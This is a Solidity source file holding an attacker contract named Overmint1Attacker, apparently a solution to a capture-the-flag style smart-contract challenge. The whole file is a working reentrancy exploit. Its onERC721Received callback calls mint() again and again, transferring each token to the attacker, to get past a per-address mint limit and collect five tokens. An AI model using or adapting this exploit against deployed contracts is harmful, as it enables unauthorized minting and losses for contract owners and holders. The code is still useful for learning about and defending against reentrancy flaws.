// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

interface IERC721Mintable {
    function balanceOf(address owner) external view returns (uint256 balance);
    // ----------- State changing Api -----------

    function mint() external;
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract Overmint1Attacker {
    IERC721Mintable overmint1;
    address attacker;

    constructor(address _overmint1) {
        overmint1 = IERC721Mintable(_overmint1);
    }

    function attack() external {
        attacker = msg.sender;
        overmint1.mint();
    }

    /**
     * @dev accept erc721 from safeTransferFrom and safeMint after callback
     * @return received selector
     */
    function onERC721Received(address, address, uint256 tokenId, bytes memory) public virtual returns (bytes4) {
        if (overmint1.balanceOf(attacker) < 5) {
            overmint1.transferFrom(address(this), attacker, tokenId);
            overmint1.mint();
            if (overmint1.balanceOf(attacker) == 5) return this.onERC721Received.selector;
        }
        return this.onERC721Received.selector;
    }
}
